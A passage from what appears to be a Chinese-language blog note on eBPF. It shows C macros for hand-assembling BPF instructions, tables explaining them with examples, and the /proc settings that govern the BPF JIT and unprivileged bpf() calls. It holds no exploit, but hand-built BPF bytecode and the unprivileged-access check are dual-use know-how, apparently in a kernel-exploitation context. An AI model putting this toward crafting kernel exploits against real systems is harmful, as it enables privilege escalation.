</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = 0 })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_MOV32_REG(DST, SRC)					\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_ALU | BPF_MOV | BPF_X,		\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = SRC,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = 0 })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Short form of mov, dst_reg = imm32 */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_MOV64_IMM(DST, IMM)					\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_ALU64 | BPF_MOV | BPF_K,		\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = IMM })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_MOV32_IMM(DST, IMM)					\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_ALU | BPF_MOV | BPF_K,		\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = IMM })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* BPF_LD_IMM64 macro encodes single &#39;load 64-bit immediate&#39; insn */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_LD_IMM64(DST, IMM)					\
</span></span></span><span class="line"><span class="cl"><span class="cp">	BPF_LD_IMM64_RAW(DST, 0, IMM)
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_LD_IMM64_RAW(DST, SRC, IMM)				\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_LD | BPF_DW | BPF_IMM,		\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = SRC,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = (__u32) (IMM) }),			\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = 0, </span><span class="cm">/* zero is reserved opcode */</span><span class="cp">	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = ((__u64) (IMM)) &gt;&gt; 32 })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#ifndef BPF_PSEUDO_MAP_FD
</span></span></span><span class="line"><span class="cl"><span class="cp"># define BPF_PSEUDO_MAP_FD	1
</span></span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_LD_MAP_FD(DST, MAP_FD)				\
</span></span></span><span class="line"><span class="cl"><span class="cp">	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Direct packet access, R0 = *(uint *) (skb-&gt;data + imm32) */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_LD_ABS(SIZE, IMM)					\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS,	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = IMM })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = SRC,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = OFF,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = 0 })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_STX_MEM(SIZE, DST, SRC, OFF)			\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = SRC,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = OFF,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = 0 })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Atomic operations:
</span></span></span><span class="line"><span class="cl"><span class="cm"> *
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   BPF_ADD                  *(uint *) (dst_reg + off16) += src_reg
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   BPF_AND                  *(uint *) (dst_reg + off16) &amp;= src_reg
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   BPF_OR                   *(uint *) (dst_reg + off16) |= src_reg
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   BPF_XOR                  *(uint *) (dst_reg + off16) ^= src_reg
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   BPF_ADD | BPF_FETCH      src_reg = atomic_fetch_add(dst_reg + off16, src_reg);
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   BPF_AND | BPF_FETCH      src_reg = atomic_fetch_and(dst_reg + off16, src_reg);
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   BPF_OR | BPF_FETCH       src_reg = atomic_fetch_or(dst_reg + off16, src_reg);
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   BPF_XOR | BPF_FETCH      src_reg = atomic_fetch_xor(dst_reg + off16, src_reg);
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   BPF_XCHG                 src_reg = atomic_xchg(dst_reg + off16, src_reg)
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   BPF_CMPXCHG              r0 = atomic_cmpxchg(dst_reg + off16, r0, src_reg)
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_ATOMIC_OP(SIZE, OP, DST, SRC, OFF)			\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_ATOMIC,	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = SRC,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = OFF,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = OP })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Legacy alias */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_STX_XADD(SIZE, DST, SRC, OFF) BPF_ATOMIC_OP(SIZE, BPF_ADD, DST, SRC, OFF)
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Memory store, *(uint *) (dst_reg + off16) = imm32 */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_ST_MEM(SIZE, DST, OFF, IMM)				\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = OFF,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = IMM })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Conditional jumps against registers, if (dst_reg &#39;op&#39; src_reg) goto pc + off16 */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_JMP_REG(OP, DST, SRC, OFF)				\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_JMP | BPF_OP(OP) | BPF_X,		\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = SRC,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = OFF,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = 0 })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Like BPF_JMP_REG, but with 32-bit wide operands for comparison. */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_JMP32_REG(OP, DST, SRC, OFF)			\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_X,	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = SRC,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = OFF,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = 0 })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Conditional jumps against immediates, if (dst_reg &#39;op&#39; imm32) goto pc + off16 */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_JMP_IMM(OP, DST, IMM, OFF)				\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_JMP | BPF_OP(OP) | BPF_K,		\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = OFF,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = IMM })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_JMP32_IMM(OP, DST, IMM, OFF)			\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_K,	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = OFF,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = IMM })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_CALL_FUNC(FUNC) \
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {                                    \
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code = BPF_JMP | BPF_CALL | BPF_K,				\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = 0,	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = 0,	\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off = 0, \
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm = FUNC })
</span></span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl"><span class="cm">/* Raw code statement block */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)			\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = CODE,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = DST,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = SRC,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = OFF,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = IMM })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/* Program exit */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define BPF_EXIT_INSN()						\
</span></span></span><span class="line"><span class="cl"><span class="cp">	((struct bpf_insn) {					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.code  = BPF_JMP | BPF_EXIT,			\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.dst_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.src_reg = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.off   = 0,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">		.imm   = 0 })
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#endif</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><h4 class="heading-element" id="alu类"><span>ALU类</span>
  <a href="#alu%e7%b1%bb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="table-wrapper">
  <table>
    <thead>
        <tr>
            <th><strong>宏名称</strong></th>
            <th><strong>逻辑</strong></th>
            <th><strong>说明</strong></th>
            <th><strong>代码示例</strong></th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><code>BPF_ALU64_REG(OP, DST, SRC)</code></td>
            <td><code>dst = dst OP src</code></td>
            <td>64位寄存器间运算</td>
            <td><code>BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2)</code></td>
        </tr>
        <tr>
            <td><code>BPF_ALU32_REG(OP, DST, SRC)</code></td>
            <td><code>(u32)dst = dst OP src</code></td>
            <td>32位寄存器间运算</td>
            <td><code>BPF_ALU32_REG(BPF_SUB, BPF_REG_1, BPF_REG_2)</code></td>
        </tr>
        <tr>
            <td><code>BPF_ALU64_IMM(OP, DST, IMM)</code></td>
            <td><code>dst = dst OP imm</code></td>
            <td>64位寄存器与立即数</td>
            <td><code>BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, 8)</code></td>
        </tr>
        <tr>
            <td><code>BPF_ALU32_IMM(OP, DST, IMM)</code></td>
            <td><code>(u32)dst = dst OP imm</code></td>
            <td>32位寄存器与立即数</td>
            <td><code>BPF_ALU32_IMM(BPF_XOR, BPF_REG_1, 0xFF)</code></td>
        </tr>
    </tbody>
  </table>
</div><blockquote>
<p><strong>常见 OP</strong>： <code>BPF_ADD / SUB / MUL / DIV / AND / OR / XOR / LSH / RSH / ARSH</code></p>
<p>ALU32 一定会清零 dst 的高 32 位</p>
</blockquote>
<h4 class="heading-element" id="赋值类"><span>赋值类</span>
  <a href="#%e8%b5%8b%e5%80%bc%e7%b1%bb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="table-wrapper">
  <table>
    <thead>
        <tr>
            <th><strong>宏名称</strong></th>
            <th><strong>逻辑</strong></th>
            <th><strong>说明</strong></th>
            <th><strong>代码示例</strong></th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><code>BPF_MOV64_REG(DST, SRC)</code></td>
            <td><code>dst = src</code></td>
            <td>64位寄存器拷贝</td>
            <td><code>BPF_MOV64_REG(BPF_REG_1, BPF_REG_0)</code></td>
        </tr>
        <tr>
            <td><code>BPF_MOV32_REG(DST, SRC)</code></td>
            <td><code>(u32)dst = src</code></td>
            <td>32位寄存器拷贝</td>
            <td><code>BPF_MOV32_REG(BPF_REG_1, BPF_REG_0)</code></td>
        </tr>
        <tr>
            <td><code>BPF_MOV64_IMM(DST, IMM)</code></td>
            <td><code>dst = imm32</code></td>
            <td>立即数存入64位寄存器</td>
            <td><code>BPF_MOV64_IMM(BPF_REG_1, 0x1337)</code></td>
        </tr>
        <tr>
            <td><code>BPF_MOV32_IMM(DST, IMM)</code></td>
            <td><code>(u32)dst = imm32</code></td>
            <td>立即数存入32位寄存器</td>
            <td><code>BPF_MOV32_IMM(BPF_REG_1, 1)</code></td>
        </tr>
    </tbody>
  </table>
</div><h4 class="heading-element" id="内存读写类"><span>内存读写类</span>
  <a href="#%e5%86%85%e5%ad%98%e8%af%bb%e5%86%99%e7%b1%bb" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="table-wrapper">
  <table>
    <thead>
        <tr>
            <th><strong>宏名称</strong></th>
            <th><strong>逻辑</strong></th>
            <th><strong>说明</strong></th>
            <th><strong>代码示例</strong></th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><code>BPF_LDX_MEM(SIZE, DST, SRC, OFF)</code></td>
            <td><code>dst = *(size *)(src+off)</code></td>
            <td><strong>Load</strong>: 内存 -&gt; 寄存器</td>
            <td><code>BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0)</code></td>
        </tr>
        <tr>
            <td><code>BPF_STX_MEM(SIZE, DST, SRC, OFF)</code></td>
            <td><code>*(size *)(dst+off) = src</code></td>
            <td><strong>Store</strong>: 寄存器 -&gt; 内存</td>
            <td><code>BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 8)</code></td>
        </tr>
        <tr>
            <td><code>BPF_ST_MEM(SIZE, DST, OFF, IMM)</code></td>
            <td><code>*(size *)(dst+off) = imm</code></td>
            <td><strong>Store</strong>: 立即数 -&gt; 内存</td>
            <td><code>BPF_ST_MEM(BPF_W, BPF_REG_1, 0, 0xDEAD)</code></td>
        </tr>
        <tr>
            <td><code>BPF_LD_IMM64(DST, IMM)</code></td>
            <td><code>dst = imm64</code></td>
            <td>加载 64 位超长立即数</td>
            <td><code>BPF_LD_IMM64(BPF_REG_1, 0xFFFF888812345678)</code></td>
        </tr>
        <tr>
            <td><code>BPF_LD_MAP_FD(DST, MAP_FD)</code></td>
            <td><code>dst = map_ptr</code></td>
            <td>将 Map 的 FD 转为内存地址</td>
            <td><code>BPF_LD_MAP_FD(BPF_REG_1, map_fd)</code></td>
        </tr>
    </tbody>
  </table>
</div><h4 class="heading-element" id="跳转指令"><span>跳转指令</span>
  <a href="#%e8%b7%b3%e8%bd%ac%e6%8c%87%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="table-wrapper">
  <table>
    <thead>
        <tr>
            <th><strong>宏名称</strong></th>
            <th><strong>逻辑</strong></th>
            <th><strong>说明</strong></th>
            <th><strong>代码示例</strong></th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><code>BPF_JMP_REG(OP, DST, SRC, OFF)</code></td>
            <td><code>if (dst OP src) PC += off</code></td>
            <td>寄存器间比较跳转</td>
            <td><code>BPF_JMP_REG(BPF_JEQ, BPF_REG_0, BPF_REG_1, 2)</code></td>
        </tr>
        <tr>
            <td><code>BPF_JMP_IMM(OP, DST, IMM, OFF)</code></td>
            <td><code>if (dst OP imm) PC += off</code></td>
            <td>寄存器与常数比较跳转</td>
            <td><code>BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 5)</code></td>
        </tr>
        <tr>
            <td><code>BPF_CALL_FUNC(FUNC)</code></td>
            <td><code>r0 = FUNC(...)</code></td>
            <td>调用内核辅助函数</td>
            <td><code>BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem)</code></td>
        </tr>
    </tbody>
  </table>
</div><h4 class="heading-element" id="其他指令"><span>其他指令</span>
  <a href="#%e5%85%b6%e4%bb%96%e6%8c%87%e4%bb%a4" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="table-wrapper">
  <table>
    <thead>
        <tr>
            <th><strong>宏名称</strong></th>
            <th><strong>逻辑</strong></th>
            <th><strong>说明</strong></th>
            <th><strong>代码示例</strong></th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td><code>BPF_EXIT_INSN()</code></td>
            <td><code>return r0</code></td>
            <td>结束程序</td>
            <td><code>BPF_EXIT_INSN()</code></td>
        </tr>
        <tr>
            <td><code>BPF_RAW_INSN(CODE, D, S, O, I)</code></td>
            <td><code>(manual)</code></td>
            <td>手动填充原生指令所有字段</td>
            <td><code>BPF_RAW_INSN(0x07, 1, 0, 0, 0x12)</code></td>
        </tr>
        <tr>
            <td><code>BPF_STX_XADD(SZ, DST, SRC, OFF)</code></td>
            <td><code>atomic_add</code></td>
            <td>原子加法</td>
            <td><code>BPF_STX_XADD(BPF_DW, BPF_REG_1, BPF_REG_0, 0)</code></td>
        </tr>
    </tbody>
  </table>
</div><h3 class="heading-element" id="proc接口"><span>proc接口</span>
  <a href="#proc%e6%8e%a5%e5%8f%a3" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li>
<p><code>/proc/sys/net/core/bpf_jit_enable</code> 可以检查 bpf 能不能被 JIT</p>
<ul>
<li>Values:
<ul>
<li>0 - disable the JIT (default value)</li>
<li>1 - enable the JIT</li>
<li>2 - enable the JIT and ask the compiler to emit traces on kernel log.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>/proc/sys/kernel/unprivileged_bpf_disabled</code> 可以检查是否能执行</p>
<ul>
<li>Values:
<ul>
<li>0 - Unprivileged calls to <code>bpf()</code> are enabled</li>
<li>1 - Unprivileged calls to <code>bpf()</code> are disabled without recovery</li>
<li>2 - Unprivileged calls to <code>bpf()</code> are disabled</li>
